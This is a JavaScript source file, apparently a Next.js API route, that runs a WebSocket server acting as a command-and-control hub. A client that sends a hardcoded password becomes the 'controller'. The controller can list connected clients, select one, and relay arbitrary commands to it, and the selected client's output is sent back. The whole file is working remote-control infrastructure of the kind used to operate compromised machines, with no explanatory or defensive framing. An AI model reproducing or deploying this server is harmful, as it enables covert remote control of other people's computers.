import { Server } from "ws";

let clients = new Map();
let selectedClient = null;
let controller = null;

export default function handler(req, res) {
  if (!res.socket.server.wss) {
    console.log("🚀 Starting WebSocket server...");
    const wss = new Server({ noServer: true });

    res.socket.server.on("upgrade", (request, socket, head) => {
      wss.handleUpgrade(request, socket, head, (ws) => {
        wss.emit("connection", ws, request);
      });
    });

    wss.on("connection", (ws, req) => {
      const clientId = req.socket.remoteAddress + ":" + req.socket.remotePort;
      clients.set(clientId, ws);
      console.log(`✅ Client connected: ${clientId}`);

      ws.on("message", (msg) => {
        let message = String(msg);
        console.log(`📥 Message from ${clientId}: ${message}`);

        if (message === "Y@to$eecjm1228!") {
          controller = clientId;
          ws.send(`✅ You are verified as Controller`);
        } else if (clientId === selectedClient) {
          if (controller && clients.has(controller)) {
            clients.get(controller).send(message);
          }
        } else if (controller === clientId) {
          if (message === "client_lists") {
            showClients();
          } else if (message.startsWith("select_client")) {
            const targetClient = message.split(" ")[1];
            selectClient(targetClient);
          } else {
            sendCommand(message);
          }
        } else {
          ws.send("ACK");
        }
      });

      ws.on("close", () => {
        clients.delete(clientId);
        console.log(`❌ Client disconnected: ${clientId}`);
        if (selectedClient === clientId) {
          selectedClient = null;
        }
      });
    });

    function showClients() {
      let msg = "\n[ CLIENT LIST ]";
      Array.from(clients.keys()).forEach((clientId, index) => {
        msg += `\n${index + 1}. ${clientId}${
          clientId === controller ? " (controller)" : ""
        }`;
      });
      clients.get(controller)?.send(msg);
    }

    function selectClient(clientId) {
      if (clients.has(clientId)) {
        selectedClient = clientId;
        clients.get(controller)?.send(`✅ Client ${clientId} selected!`);
      } else {
        clients.get(controller)?.send("❌ Client not found.");
      }
    }

    function sendCommand(command) {
      if (selectedClient && clients.has(selectedClient)) {
        clients.get(selectedClient)?.send(command);
      } else {
        clients
          .get(controller)
          ?.send("❌ No client selected or client disconnected!");
      }
    }

    res.socket.server.wss = wss;
  }

  res.end();
}
